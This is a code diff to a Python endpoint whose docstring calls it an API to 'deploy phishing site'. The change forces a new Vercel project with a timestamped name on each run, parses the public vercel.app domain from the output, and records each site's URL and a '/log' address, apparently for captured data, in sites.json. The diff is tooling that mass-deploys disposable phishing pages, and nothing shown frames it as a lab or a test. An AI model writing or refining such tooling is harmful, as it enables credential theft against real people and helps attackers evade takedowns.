@@ -89,25 +89,48 @@ def generate_page():
 def deploy():
     """API endpoint to deploy phishing site"""
     import subprocess
-    from constants import VERCEL_DEPLOY_CMD
     import json
     from datetime import datetime
+    import re
+    import time
+    import os
+    import shutil
     
     try:
-        # Run Vercel deployment
+        # Delete .vercel directory to force a new project creation
+        vercel_dir = 'build/.vercel'
+        if os.path.exists(vercel_dir):
+            shutil.rmtree(vercel_dir)
+        
+        # Generate unique project name
+        timestamp = str(int(time.time()))
+        project_name = f"page-{timestamp}"
+        
+        # Run Vercel deployment with unique project name
+        deploy_cmd = f"vercel deploy --prod --cwd build --yes --name {project_name}"
         result = subprocess.run(
-            VERCEL_DEPLOY_CMD.split(),
+            deploy_cmd,
+            shell=True,
             capture_output=True,
             text=True
         )
         
         if result.returncode == 0:
-            # Extract deployment URL from output
+            # Extract the domain URL (format: project-name.vercel.app)
+            domain_pattern = r'https://([a-z0-9-]+\.vercel\.app)'
+            matches = re.findall(domain_pattern, result.stdout)
+            
             deployment_url = None
-            for line in result.stdout.split('\n'):
-                if 'https://' in line and 'vercel.app' in line:
-                    deployment_url = line.strip()
-                    break
+            if matches:
+                # Get the domain (not the deployment URL)
+                domain = matches[-1]  # Last match is usually the production domain
+                deployment_url = f"https://{domain}"
+            else:
+                # Fallback: extract any vercel URL
+                for line in result.stdout.split('\n'):
+                    if 'https://' in line and 'vercel.app' in line:
+                        deployment_url = line.strip()
+                        break
             
             if deployment_url:
                 # Save to sites.json
@@ -122,7 +145,8 @@ def deploy():
                     'id': site_id,
                     'url': deployment_url,
                     'log_url': f"{deployment_url}/log",
-                    'creation_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                    'creation_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                    'project_name': project_name
                 })
                 
                 with open('sites.json', 'w') as f:
